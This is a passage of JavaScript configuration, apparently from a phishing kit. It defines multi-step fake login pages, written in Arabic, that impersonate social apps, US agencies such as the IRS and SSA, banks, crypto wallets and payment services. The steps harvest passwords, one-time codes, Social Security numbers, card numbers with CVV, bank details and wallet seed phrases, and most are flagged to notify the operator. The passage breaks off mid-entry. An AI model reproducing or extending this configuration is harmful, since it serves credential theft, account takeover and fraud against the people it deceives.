    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Reddit',           subheadline:'أدخل بياناتك للمتابعة',                     fields:['username','password'],layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'تحقق الهوية',  headline:'أدخل كود التحقق',                subheadline:'أرسلنا كود SMS إلى هاتفك',                   fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  tumblr: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Tumblr',           subheadline:'',                                           fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'تحقق الهوية',  headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك',               fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  discord: [
    { slug:'login', form_type:'login', page_title:'مرحباً بعودتك',  headline:'مرحباً بعودتك!',                  subheadline:'أسعدنا رؤيتك مجدداً',                       fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login', notify_step:true  },
    { slug:'2fa',   form_type:'otp',   page_title:'التحقق بخطوتين', headline:'التحقق بخطوتين',                 subheadline:'أدخل الكود من تطبيق المصادقة',              fields:['code'],              layout:'otp',  cta:'تسجيل الدخول', step_label:'2FA',   notify_step:true,  otp_length:6 }
  ],

  whatsapp: [
    { slug:'login',    form_type:'login', page_title:'أدخل رقم هاتفك', headline:'أدخل رقم هاتفك',               subheadline:'سنرسل لك كود تحقق برسالة نصية',              fields:['phone'],             layout:'auth', cta:'التالي',       step_label:'Phone',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',      headline:'أدخل الكود المرسل',            subheadline:'تحقق من رقم هاتفك بكود 6 أرقام',            fields:['code'],              layout:'otp',  cta:'التالي',       step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  telegram: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Telegram',         subheadline:'أدخل رقم هاتفك',                             fields:['phone'],             layout:'auth', cta:'التالي',       step_label:'Phone',  notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',   headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك أو تطبيق Telegram',fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'OTP',    notify_step:true,  otp_length:5 }
  ],

  wechat: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'تسجيل الدخول إلى WeChat',        subheadline:'أدخل رقم هاتفك أو الإيميل',                  fields:['phone','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك',                fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  line: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في LINE',             subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',        fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'تحقق من هويتك برسالة نصية',                 fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  viber: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Viber',            subheadline:'أدخل رقم هاتفك',                             fields:['phone'],             layout:'auth', cta:'متابعة',       step_label:'Phone',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',   headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك',                fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  bereal: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في BeReal',           subheadline:'أدخل رقم هاتفك',                             fields:['phone'],             layout:'auth', cta:'متابعة',       step_label:'Phone',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',   headline:'أدخل الكود المرسل',              subheadline:'أرسلنا كوداً برسالة نصية',                   fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  clubhouse: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Clubhouse',        subheadline:'أدخل رقم هاتفك للمتابعة',                   fields:['phone'],             layout:'auth', cta:'إرسال الكود',  step_label:'Phone',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'كود التحقق',   headline:'أدخل الكود المرسل',              subheadline:'أرسلنا كود تحقق إلى رقم هاتفك',             fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  mastodon: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك',                     subheadline:'أدخل بيانات حسابك على Mastodon',             fields:['email','password'],  layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى بريدك الإلكتروني',         fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'OTP',      notify_step:true,  otp_length:6 }
  ],

  threads: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'سجّل دخولك في Threads',          subheadline:'أدخل بيانات حساب Instagram الخاص بك',       fields:['username','password'],layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'أرسلنا كود برسالة نصية',                     fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'OTP',      notify_step:true,  otp_length:6 }
  ],

  youtube: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول', headline:'تسجيل الدخول إلى YouTube',       subheadline:'أدخل بريدك الإلكتروني أو رقم هاتفك',        fields:['email'],             layout:'auth', cta:'التالي',       step_label:'Email',    notify_step:true  },
    { slug:'password', form_type:'login', page_title:'كلمة المرور',  headline:'مرحباً',                          subheadline:'أدخل كلمة المرور الخاصة بحسابك',            fields:['password'],          layout:'auth', cta:'التالي',       step_label:'Password', notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',       headline:'أدخل كود التحقق',                subheadline:'أرسلنا كوداً إلى رقم هاتفك',                fields:['code'],              layout:'otp',  cta:'تأكيد',        step_label:'2FA',      notify_step:true,  otp_length:6 }
  ],

  // ── GOVERNMENT ──────────────────────────────────────────────────────────────

  irs: [
    { slug:'login',          form_type:'login',      page_title:'تسجيل الدخول',       headline:'تسجيل الدخول إلى IRS',               subheadline:'أدخل رقم الضمان الاجتماعي واسم المستخدم وكلمة المرور', fields:['ssn','username','password'],              layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
    { slug:'security-q',     form_type:'security_q', page_title:'أسئلة الأمان',        headline:'أسئلة التحقق الأمني',               subheadline:'أجب على أسئلة الأمان للتحقق من هويتك',               fields:['answer1','answer2','answer3'],            layout:'security_q',cta:'متابعة',        step_label:'Security Questions',notify_step:true  },
    { slug:'id-verify',      form_type:'id_verify',  page_title:'تحقق من هويتك',       headline:'أكّد هويتك',                         subheadline:'أدخل آخر 4 أرقام من SSN وآخر 4 أرقام من بطاقتك',     fields:['ssn_last4','card_last4'],                 layout:'verify',    cta:'متابعة',        step_label:'ID Verify',        notify_step:true  },
    { slug:'verify-address', form_type:'verify',     page_title:'تأكيد العنوان',        headline:'أكّد عنوانك',                        subheadline:'أدخل عنوانك البريدي الحالي',                          fields:['address','city','state','zip'],           layout:'verify',    cta:'متابعة',        step_label:'Verify Address',   notify_step:true  },
    { slug:'payment-setup',  form_type:'payment',    page_title:'إعداد الدفع',          headline:'معلومات الدفع البنكي',               subheadline:'أدخل بيانات حسابك البنكي للاسترداد الضريبي',          fields:['routing_number','account_number','bank'], layout:'payment',   cta:'إرسال',         step_label:'Bank Details',     notify_step:true  }
  ],

  ssa: [
    { slug:'login',     form_type:'login',    page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى my Social Security',subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],    layout:'auth',   cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
    { slug:'sms-code',  form_type:'otp',      page_title:'التحقق',          headline:'أدخل كود التحقق',                    subheadline:'أرسلنا كوداً إلى رقم هاتفك',              fields:['code'],                   layout:'otp',    cta:'تأكيد',        step_label:'SMS Code',   notify_step:true,  otp_length:8 },
    { slug:'id-confirm',form_type:'id_verify',page_title:'تأكيد الهوية',    headline:'أكّد هويتك',                         subheadline:'أدخل رقم الضمان الاجتماعي وتاريخ الميلاد', fields:['ssn','dob'],              layout:'verify', cta:'تأكيد',        step_label:'ID Confirm', notify_step:true  }
  ],

  dmv: [
    { slug:'login',     form_type:'login',    page_title:'تسجيل الدخول',   headline:'بوابة DMV الإلكترونية',              subheadline:'أدخل رقم رخصة القيادة وتاريخ الميلاد',    fields:['dl_number','dob'],        layout:'auth',   cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
    { slug:'ssn-verify',form_type:'id_verify',page_title:'تحقق من الهوية', headline:'تحقق من رقم الضمان الاجتماعي',      subheadline:'أدخل آخر 4 أرقام من رقم الضمان الاجتماعي', fields:['ssn_last4'],              layout:'verify', cta:'متابعة',       step_label:'SSN Verify', notify_step:true  },
    { slug:'payment',   form_type:'payment',  page_title:'الدفع',           headline:'أدخل بيانات بطاقتك',                subheadline:'ادفع رسوم التجديد أو الاستبدال',           fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'دفع الرسوم',   step_label:'Payment',    notify_step:true  }
  ],

  uscis: [
    { slug:'login',     form_type:'login',    page_title:'تسجيل الدخول',   headline:'بوابة USCIS',                        subheadline:'أدخل اسم المستخدم وكلمة المرور ورقم الضمان الاجتماعي', fields:['username','password','ssn'], layout:'auth',   cta:'تسجيل الدخول', step_label:'Login',      notify_step:true  },
    { slug:'sms-code',  form_type:'otp',      page_title:'التحقق',          headline:'كود التحقق',                         subheadline:'أرسلنا كود تحقق برسالة نصية',              fields:['code'],                      layout:'otp',    cta:'تأكيد',        step_label:'SMS Code',   notify_step:true,  otp_length:6 },
    { slug:'id-confirm',form_type:'id_verify',page_title:'تأكيد الهوية',    headline:'تأكيد بيانات الهوية',               subheadline:'أدخل رقم الضمان وتاريخ الميلاد',          fields:['ssn','dob'],                 layout:'verify', cta:'تأكيد',        step_label:'ID Confirm', notify_step:true  }
  ],

  usps: [
    { slug:'login',          form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى USPS',             subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',      fields:['email','password'],   layout:'auth',   cta:'تسجيل الدخول',     step_label:'Login',          notify_step:true  },
    { slug:'verify-address', form_type:'verify', page_title:'تأكيد العنوان',   headline:'تأكيد عنوان التسليم',               subheadline:'أدخل عنوانك لتتبع التسليم',               fields:['address','city','zip'],layout:'verify', cta:'تأكيد',            step_label:'Verify Address', notify_step:true  },
    { slug:'confirm',        form_type:'confirm',page_title:'تم التأكيد',       headline:'تم تأكيد طلبك',                     subheadline:'سيتم إرسال الحزمة خلال 2-5 أيام عمل',     fields:[],                     layout:'confirm',cta:'العودة للرئيسية',  step_label:'Complete',       notify_step:false }
  ],

  // Other government brands use category default flow built at bottom

  // ── BANKS ───────────────────────────────────────────────────────────────────

  jpmorganchase: [
    { slug:'login',        form_type:'login',      page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Chase Online',     subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],                      layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
    { slug:'sms-otp',      form_type:'otp',        page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً من 6 أرقام إلى رقم هاتفك',  fields:['code'],                                     layout:'otp',       cta:'تأكيد',        step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
    { slug:'security-q',   form_type:'security_q', page_title:'أسئلة الأمان',   headline:'أسئلة التحقق الأمني',               subheadline:'أجب على أسئلة الأمان للتحقق من هويتك',  fields:['answer1','answer2','answer3'],               layout:'security_q',cta:'متابعة',       step_label:'Security Questions',notify_step:true  },
    { slug:'confirm-card', form_type:'payment',    page_title:'تأكيد البطاقة',  headline:'تأكيد بيانات بطاقتك',               subheadline:'أدخل معلومات بطاقتك للتحقق من هويتك',   fields:['card_last4','expiry','cvv'],                 layout:'payment',   cta:'تأكيد',        step_label:'Confirm Card',     notify_step:true  }
  ],

  bankofamerica: [
    { slug:'login',      form_type:'login',      page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Bank of America',  subheadline:'أدخل هوية الدخول عبر الإنترنت وكلمة المرور', fields:['online_id','password'],              layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
    { slug:'sms-otp',    form_type:'otp',        page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك',               fields:['code'],                              layout:'otp',       cta:'تأكيد',        step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
    { slug:'security-q', form_type:'security_q', page_title:'أسئلة الأمان',   headline:'سؤال الأمان',                        subheadline:'أجب على سؤال الأمان للمتابعة',              fields:['answer1','answer2'],                 layout:'security_q',cta:'متابعة',       step_label:'Security Questions',notify_step:true  }
  ],

  wellsfargo: [
    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Wells Fargo',      subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],          layout:'auth',  cta:'تسجيل الدخول',   step_label:'Login',          notify_step:true  },
    { slug:'sms-otp',         form_type:'otp',    page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك',              fields:['code'],                         layout:'otp',   cta:'تأكيد',          step_label:'SMS OTP',        notify_step:true,  otp_length:6 },
    { slug:'confirm-account', form_type:'verify', page_title:'تأكيد الحساب',   headline:'تأكيد رقم حسابك',                   subheadline:'أدخل آخر 4 أرقام من رقم حسابك البنكي',   fields:['account_last4'],                layout:'verify',cta:'تأكيد',          step_label:'Confirm Account',notify_step:true  }
  ],

  citibank: [
    { slug:'login',      form_type:'login',      page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Citi',             subheadline:'أدخل معرّف المستخدم وكلمة المرور',        fields:['user_id','password'],        layout:'auth',      cta:'تسجيل الدخول', step_label:'Login',            notify_step:true  },
    { slug:'sms-otp',    form_type:'otp',        page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً برسالة نصية',                 fields:['code'],                      layout:'otp',       cta:'تأكيد',        step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
    { slug:'security-q', form_type:'security_q', page_title:'أسئلة الأمان',   headline:'أسئلة الأمان',                      subheadline:'أجب على الأسئلة للمتابعة',                 fields:['answer1','answer2','answer3'],layout:'security_q',cta:'متابعة',       step_label:'Security Questions',notify_step:true  }
  ],

  hsbc: [
    { slug:'login',    form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى HSBC',             subheadline:'أدخل اسم المستخدم وكلمة المرور',          fields:['username','password'],   layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',           notify_step:true  },
    { slug:'memo',     form_type:'verify', page_title:'كلمة التذكر',    headline:'أدخل كلمة التذكر',                  subheadline:'أدخل الكلمة المميزة لحسابك',               fields:['memorable_word'],         layout:'verify',cta:'متابعة',       step_label:'Memorable Answer', notify_step:true  },
    { slug:'sms-otp',  form_type:'otp',    page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً إلى رقم هاتفك',              fields:['code'],                   layout:'otp',   cta:'تأكيد',        step_label:'OTP',             notify_step:true,  otp_length:6 }
  ],

  emiratesnbd: [
    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى Emirates NBD',     subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'],           layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
    { slug:'sms-otp',      form_type:'otp',    page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كود OTP إلى رقم هاتفك المسجّل',    fields:['code'],                             layout:'otp',   cta:'تأكيد',         step_label:'SMS OTP',      notify_step:true,  otp_length:6 },
    { slug:'confirm-card', form_type:'payment',page_title:'تأكيد البطاقة',   headline:'تأكيد بيانات بطاقتك',               subheadline:'أدخل بيانات بطاقتك للتحقق من هويتك',      fields:['card_number','expiry','cvv'],        layout:'payment',cta:'تأكيد',         step_label:'Card Confirm', notify_step:true  }
  ],

  mashreq: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Mashreq',          subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-otp',  form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود OTP',                      subheadline:'أرسلنا كود OTP إلى رقم هاتفك',             fields:['code'],                   layout:'otp',  cta:'تأكيد',        step_label:'OTP',      notify_step:true,  otp_length:6 }
  ],

  qnb: [
    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى QNB',              subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'],         layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
    { slug:'sms-otp',      form_type:'otp',    page_title:'التحقق',         headline:'أدخل كود OTP',                      subheadline:'أرسلنا كود OTP إلى رقم هاتفك المسجّل',    fields:['code'],                           layout:'otp',   cta:'تأكيد',         step_label:'OTP',          notify_step:true,  otp_length:6 },
    { slug:'confirm-card', form_type:'payment',page_title:'تأكيد البطاقة',  headline:'تأكيد بيانات البطاقة',              subheadline:'أدخل بيانات بطاقتك',                      fields:['card_number','expiry','cvv'],      layout:'payment',cta:'تأكيد',         step_label:'Card Confirm', notify_step:true  }
  ],

  adcb: [
    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى ADCB',             subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'],         layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
    { slug:'sms-otp',      form_type:'otp',    page_title:'التحقق',         headline:'كود OTP',                           subheadline:'أرسلنا كود OTP إلى رقم هاتفك',             fields:['code'],                           layout:'otp',   cta:'تأكيد',         step_label:'OTP',          notify_step:true,  otp_length:6 },
    { slug:'confirm-card', form_type:'payment',page_title:'تأكيد البطاقة',  headline:'تأكيد بيانات بطاقتك',              subheadline:'أدخل بيانات بطاقتك للتحقق',               fields:['card_number','expiry','cvv'],      layout:'payment',cta:'تأكيد',         step_label:'Card Confirm', notify_step:true  }
  ],

  fab: [
    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى FAB',              subheadline:'أدخل رقم العميل وكلمة المرور',             fields:['customer_id','password'],         layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
    { slug:'sms-otp',      form_type:'otp',    page_title:'كود OTP',        headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كود OTP إلى رقم هاتفك المسجّل',    fields:['code'],                           layout:'otp',   cta:'تأكيد',         step_label:'OTP',          notify_step:true,  otp_length:6 },
    { slug:'confirm-card', form_type:'payment',page_title:'تأكيد البطاقة',  headline:'تأكيد بيانات البطاقة',              subheadline:'أدخل بيانات بطاقتك للتحقق',               fields:['card_number','expiry','cvv'],      layout:'payment',cta:'تأكيد',         step_label:'Card Confirm', notify_step:true  }
  ],

  // ── CRYPTO ──────────────────────────────────────────────────────────────────

  binance: [
    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',   headline:'أهلاً في Binance',                  subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',       fields:['email','password'],    layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',        notify_step:true  },
    { slug:'2fa-email',    form_type:'otp',    page_title:'تحقق البريد',     headline:'تحقق من بريدك الإلكتروني',          subheadline:'أدخل الكود المرسل إلى بريدك الإلكتروني',   fields:['code'],                layout:'otp',   cta:'تأكيد',         step_label:'Email 2FA',    notify_step:true,  otp_length:6 },
    { slug:'2fa-phone',    form_type:'otp',    page_title:'تحقق الهاتف',     headline:'تحقق من رقم هاتفك',                 subheadline:'أدخل الكود المرسل برسالة SMS إلى هاتفك',    fields:['code'],                layout:'otp',   cta:'تأكيد',         step_label:'SMS 2FA',      notify_step:true,  otp_length:6 },
    { slug:'anti-phishing',form_type:'verify', page_title:'رمز مكافحة التصيد',headline:'أدخل رمز مكافحة التصيد الخاص بك',  subheadline:'الرمز الذي أعددته لحماية حسابك',           fields:['anti_phishing_code'],  layout:'verify',cta:'تأكيد',         step_label:'Anti-Phishing',notify_step:true  }
  ],

  coinbase: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Coinbase',         subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',       fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'2fa-sms',  form_type:'otp',   page_title:'التحقق بخطوتين', headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً من 7 أرقام إلى رقم هاتفك',    fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'2FA SMS',  notify_step:true,  otp_length:7 }
  ],

  metamask: [
    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة المحفظة',  headline:'استيراد محفظة موجودة',               subheadline:'أدخل عبارة الاسترداد السرية المكونة من 12 أو 24 كلمة', fields:['seed_phrase'],      layout:'otp_long',cta:'استيراد',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 },
    { slug:'password',    form_type:'login',    page_title:'إنشاء كلمة مرور',   headline:'إنشاء كلمة مرور جديدة',              subheadline:'ستُستخدم لفتح MetaMask على هذا الجهاز',                 fields:['password','confirm_password'], layout:'auth',cta:'استيراد',      step_label:'Password',    notify_step:true  }
  ],

  trustwallet: [
    { slug:'seed-phrase', form_type:'otp_long', page_title:'استيراد المحفظة',   headline:'استيراد المحفظة الموجودة',           subheadline:'أدخل عبارة الاسترداد السرية المكونة من 12 كلمة',       fields:['seed_phrase'],      layout:'otp_long',cta:'استيراد',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
  ],

  ledger: [
    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة الجهاز',    headline:'أدخل عبارة الاسترداد',               subheadline:'أدخل عبارة الاسترداد السرية المكونة من 24 كلمة',       fields:['seed_phrase'],      layout:'otp_long',cta:'استعادة',     step_label:'Seed Phrase', notify_step:true,  otp_length:24 },
    { slug:'pin',         form_type:'otp',      page_title:'رمز PIN',           headline:'أدخل رمز PIN',                        subheadline:'أدخل رمز PIN الخاص بجهاز Ledger (8 أرقام)',            fields:['code'],             layout:'otp',     cta:'تأكيد',      step_label:'PIN',         notify_step:true,  otp_length:8 }
  ],

  trezor: [
    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة الجهاز',    headline:'استعادة المحفظة',                    subheadline:'أدخل عبارة الاسترداد المكونة من 12 أو 24 كلمة',        fields:['seed_phrase'],      layout:'otp_long',cta:'استعادة',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
  ],

  exodus: [
    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة المحفظة',   headline:'استعادة محفظة Exodus',               subheadline:'أدخل عبارة الاسترداد السرية من 12 كلمة',               fields:['seed_phrase'],      layout:'otp_long',cta:'استعادة',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
  ],

  phantom: [
    { slug:'seed-phrase', form_type:'otp_long', page_title:'استيراد محفظة',     headline:'استيراد محفظة موجودة',               subheadline:'أدخل عبارة الاسترداد السرية من 12 كلمة',               fields:['seed_phrase'],      layout:'otp_long',cta:'استيراد',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 },
    { slug:'password',    form_type:'login',    page_title:'كلمة المرور',        headline:'إنشاء كلمة مرور',                    subheadline:'أنشئ كلمة مرور لحماية محفظتك على هذا الجهاز',         fields:['password','confirm_password'], layout:'auth',cta:'متابعة',      step_label:'Password',    notify_step:true  }
  ],

  solflare: [
    { slug:'seed-phrase', form_type:'otp_long', page_title:'استعادة المحفظة',   headline:'استعادة محفظتك',                     subheadline:'أدخل عبارة الاسترداد السرية',                          fields:['seed_phrase'],      layout:'otp_long',cta:'استعادة',     step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
  ],

  // ── PAYMENTS ────────────────────────────────────────────────────────────────

  paypal: [
    { slug:'login',           form_type:'login',  page_title:'تسجيل الدخول',   headline:'تسجيل الدخول إلى PayPal',           subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',       fields:['email','password'],                          layout:'auth',  cta:'تسجيل الدخول',   step_label:'Login',           notify_step:true  },
    { slug:'sms-code',        form_type:'otp',    page_title:'التحقق',          headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً من 6 أرقام إلى رقم هاتفك',    fields:['code'],                                      layout:'otp',   cta:'تأكيد',          step_label:'SMS Code',        notify_step:true,  otp_length:6 },
    { slug:'confirm-card',    form_type:'payment',page_title:'تأكيد بطاقتك',    headline:'تأكيد بيانات بطاقتك',               subheadline:'أدخل معلومات بطاقتك للتحقق من هويتك',      fields:['card_number','expiry','cvv'],                 layout:'payment',cta:'تأكيد',          step_label:'Confirm Card',    notify_step:true  },
    { slug:'billing-address', form_type:'verify', page_title:'عنوان الفاتورة',  headline:'عنوان الفاتورة',                    subheadline:'أكّد عنوان الفاتورة المرتبط بحسابك',       fields:['address','city','state','zip'],               layout:'verify',cta:'حفظ وتأكيد',     step_label:'Billing Address', notify_step:true  }
  ],

  venmo: [
    { slug:'login',    form_type:'login', page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Venmo',               subheadline:'أدخل الإيميل أو الهاتف وكلمة المرور',      fields:['email','password'], layout:'auth', cta:'تسجيل الدخول', step_label:'Login',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',   page_title:'التحقق',         headline:'أدخل كود التحقق',                   subheadline:'أرسلنا كوداً برسالة نصية',                   fields:['code'],             layout:'otp',  cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 }
  ],

  zelle: [
    { slug:'login',        form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول عبر Zelle',            subheadline:'أدخل بيانات حسابك البنكي',                  fields:['username','password'],                layout:'auth',  cta:'تسجيل الدخول',  step_label:'Login',          notify_step:true  },
    { slug:'sms-otp',      form_type:'otp',    page_title:'التحقق',         headline:'كود التحقق',                        subheadline:'أرسلنا كوداً برسالة نصية',                   fields:['code'],                               layout:'otp',   cta:'تأكيد',         step_label:'OTP',            notify_step:true,  otp_length:6 },
    { slug:'confirm-send', form_type:'verify', page_title:'تأكيد التحويل',  headline:'تأكيد بيانات التحويل',              subheadline:'راجع بيانات التحويل قبل الإرسال',            fields:['recipient','amount'],                 layout:'verify',cta:'تأكيد الإرسال', step_label:'Confirm Transfer',notify_step:true  }
  ],

  cashapp: [
    { slug:'login',    form_type:'login',  page_title:'تسجيل الدخول',  headline:'سجّل دخولك في Cash App',            subheadline:'أدخل رقم هاتفك أو بريدك الإلكتروني',       fields:['phone'],             layout:'auth',  cta:'تسجيل الدخول', step_label:'Phone',    notify_step:true  },
    { slug:'sms-code', form_type:'otp',    page_title:'كود التحقق',     headline:'أدخل الكود المرسل',                 subheadline:'أرسلنا كود تحقق برسالة نصية',               fields:['code'],              layout:'otp',   cta:'تأكيد',        step_label:'SMS Code', notify_step:true,  otp_length:6 },
    { slug:'cashtag',  form_type:'verify', page_title:'إعداد الـ $Cashtag',headline:'اختر $Cashtag الخاص بك',           subheadline:'الـ Cashtag هو طريقتك الشخصية للاستقبال',   fields:['cashtag'],           layout:'verify',cta:'متابعة',       step_label:'Cashtag',  notify_step:true  }
  ],

  wise: [
    { slug:'login',    form_type:'login',  page_title:'تسجيل الدخول',  headline:'تسجيل الدخول إلى Wise',             subheadline:'أدخل بريدك الإلكتروني وكلمة المرور',       fields:['email','password'],  layout:'auth',  cta:'تسجيل الدخول', step_label:'Login',     notify_step:true  },
    { slug:'2fa',      form_type:'otp',    page_title:'التحقق بخطوتين', headline:'كود التحقق',                        subheadline:'أدخل الكود من تطبيق المصادقة',              fields:['code'],              layout:'otp',   cta:'تأكيد',        step_label:'2FA',       notify_step:true,  otp_length:6 },
    { slug:'id-verify',form_type:'verify', page_title:'تحقق من هويتك', headline:'التحقق من الهوية مطلوب',            subheadline:'ارفع جواز سفرك أو بطاقة هويتك الوطنية',    fields:['full_name','dob','id_number'], layout:'verify',cta:'رفع المستند',  step_label:'ID Verify', notify_step:true  }
  ],

  // ── EMAIL ───────────────────────────────────────────────────────────────────

  gmail: [
